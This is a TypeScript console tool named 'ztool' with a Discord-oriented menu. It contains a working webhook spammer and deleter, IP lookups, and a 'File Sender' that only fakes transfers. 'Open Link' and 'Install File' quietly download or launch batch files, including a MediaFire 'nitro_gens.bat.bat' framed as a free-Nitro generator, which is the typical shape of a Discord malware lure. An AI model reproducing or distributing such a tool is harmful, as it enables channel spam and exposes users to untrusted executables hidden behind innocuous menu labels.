import * as readline from 'readline-sync';
import axios from 'axios';
import * as fs from 'fs';
import * as path from 'path';
import { exec } from 'child_process';

async function mainMenu() {
    while (true) {
        console.clear();
        console.log('==============================');
        console.log('           ztool              ');
        console.log('==============================');
        console.log('1. Send Discord Webhook Message');
        console.log('2. Delete Discord Webhook');
        console.log('3. IP Address Lookup');
        console.log('4. What\'s My IP?');
        console.log('5. File Sender');
        console.log('6. Open Link');
        console.log('7. Open Nitro Gen');
        console.log('8. Color Switch for GUI');
        console.log('9. Install File');
        console.log('0. Exit');
        console.log('==============================');
        const choice = readline.question('Please choose an option (0-9): ');

        switch (choice) {
            case '1':
                await webhookSpammer();
                break;
            case '2':
                await webhookDeleter();
                break;
            case '3':
                await ipLookup();
                break;
            case '4':
                await whatsMyIp();
                break;
            case '5':
                await fileSender();
                break;
            case '6':
                openLink();
                break;
            case '7':
                openNitroGen();
                break;
            case '8':
                colorSwitch();
                break;
            case '9':
                installFile();
                break;
            case '0':
                process.exit(0);
            default:
                console.log('Invalid option! Please choose again.');
                readline.question('Press any key to continue...');
        }
    }
}

async function webhookSpammer() {
    console.clear();
    console.log('==============================');
    console.log('     Discord Webhook Spammer  ');
    console.log('==============================');
    const webhookUrl = readline.question('Enter Discord webhook URL: ');
    const message = readline.question('Enter message to spam: ');
    const messageCount = readline.questionInt('Enter number of messages to send: ');

    console.log(`Spamming Discord webhook ${webhookUrl} with ${messageCount} messages...`);
    for (let i = 1; i <= messageCount; i++) {
        console.log(`Sending message ${i}...`);
        await axios.post(webhookUrl, { content: message }).catch(err => console.error(err));
    }

    console.log('Webhook spam complete.');
    readline.question('Press any key to return to main menu...');
}

async function webhookDeleter() {
    console.clear();
    console.log('==============================');
    console.log('    Delete Discord Webhook    ');
    console.log('==============================');
    const webhookUrl = readline.question('Enter Discord webhook URL to delete: ');

    console.log(`Deleting Discord webhook ${webhookUrl}...`);
    await axios.delete(webhookUrl).catch(err => console.error(err));
    console.log('Webhook deleted.');
    readline.question('Press any key to return to main menu...');
}

async function ipLookup() {
    console.clear();
    console.log('==============================');
    console.log('        IP Address Lookup     ');
    console.log('==============================');
    const ipAddress = readline.question('Enter IP address to lookup: ');

    console.log(`Looking up information for IP address ${ipAddress}...`);
    const response = await axios.get(`https://ipinfo.io/${ipAddress}/json`).catch(err => console.error(err));
    console.log(response.data);
    readline.question('Press any key to return to main menu...');
}

async function whatsMyIp() {
    console.clear();
    console.log('==============================');
    console.log('        What\'s My IP?         ');
    console.log('==============================');

    console.log('Retrieving your current IP address...');
    const response = await axios.get('https://ipinfo.io/ip').catch(err => console.error(err));
    console.log(`Your IP address is: ${response.data}`);
    readline.question('Press any key to return to main menu...');
}

async function fileSender() {
    console.clear();
    console.log('==============================');
    console.log('         File Sender          ');
    console.log('==============================');
    const ip = readline.question('Enter IP address to send file to: ');
    const numGb = readline.questionInt('Enter number of gigabytes to send: ');

    if (numGb < 1) {
        console.log('Input must be at least 1.');
        readline.question('Press any key to return to main menu...');
        return;
    }

    for (let i = 1; i <= numGb; i++) {
        console.log(`Sending file: 1 GB to ${ip} - Packet ${i}`);
        // Actual file sending implementation would go here
        await new Promise(resolve => setTimeout(resolve, 2000)); // Simulate delay
    }

    console.log(`File sent successfully to ${ip}.`);
    readline.question('Press any key to return to main menu...');
}

function openLink() {
    console.clear();
    console.log('==============================');
    console.log('         Open Link            ');
    console.log('==============================');
    const url = 'https://www.mediafire.com/file/vq2259ec6q0tkow/nitro_gens.bat.bat/file';
    console.log(`Opening link: ${url}`);
    exec(`start ${url}`);
    readline.question('Press any key to return to main menu...');
}

function openNitroGen() {
    console.clear();
    console.log('==============================');
    console.log('         Open Nitro Gen       ');
    console.log('==============================');
    const url = 'https://nitro-gen-nine.vercel.app/';
    console.log(`Opening Nitro Gen: ${url}`);
    exec(`start ${url}`);
    readline.question('Press any key to return to main menu...');
}

function colorSwitch() {
    console.clear();
    console.log('==============================');
    console.log('    Color Switch for GUI      ');
    console.log('==============================');
    console.log('Choose a color for the GUI:');
    console.log('1. Red');
    console.log('2. Blue');
    console.log('3. Green');
    console.log('4. Turquoise');
    console.log('5. Magenta');
    console.log('6. Yellow');
    console.log('7. White');
    console.log('8. Grey');
    console.log('9. Light Blue');
    console.log('A. Light Green');
    console.log('B. Light Turquoise');
    console.log('C. Light Red');
    console.log('D. Light Magenta');
    console.log('E. Light Yellow');
    console.log('F. Light White');
    console.log('X. Rainbow Animation');
    console.log('==============================');
    const colorChoice = readline.question('Enter color choice (1-9, A-F, X): ');

    if (colorChoice.toUpperCase() === 'X') {
        rainbowAnimation();
        return;
    }

    const colors: { [key: string]: string } = {
        '1': '4',
        '2': '1',
        '3': '2',
        '4': '3',
        '5': '5',
        '6': '6',
        '7': '7',
        '8': '8',
        '9': '9',
        'A': 'A',
        'B': 'B',
        'C': 'C',
        'D': 'D',
        'E': 'E',
        'F': 'F'
    };

    if (colors[colorChoice.toUpperCase()]) {
        exec(`color ${colors[colorChoice.toUpperCase()]}`);
        console.log(`Color changed to ${colorChoice}.`);
    } else {
        console.log('Invalid color choice.');
    }

    readline.question('Press any key to return to main menu...');
}

function rainbowAnimation() {
    console.clear();
    console.log('==============================');
    console.log('     Rainbow Animation        ');
    console.log('==============================');
    console.log('Press Ctrl+C to stop the animation.');
    const chars = ['\\', '|', '/', '-'];
    let index = 0;

    const interval = setInterval(() => {
        console.clear();
        console.log(chars[index]);
        index = (index + 1) % chars.length;
    }, 100);

    readline.question('Press any key to return to main menu...');
    clearInterval(interval);
}

function installFile() {
    console.clear();
    console.log('==============================');
    console.log('         Install File         ');
    console.log('==============================');
    const filePath = 'C:\\Users\\Korbu\\Desktop\\surccecode.bat - Kopie800o - Kopie';
    console.log(`Installing file: ${filePath}`);
    exec(`start "" "${filePath}"`);
    console.log('File installation started.');
    readline.question('Press any key to return to main menu...');
}

mainMenu();
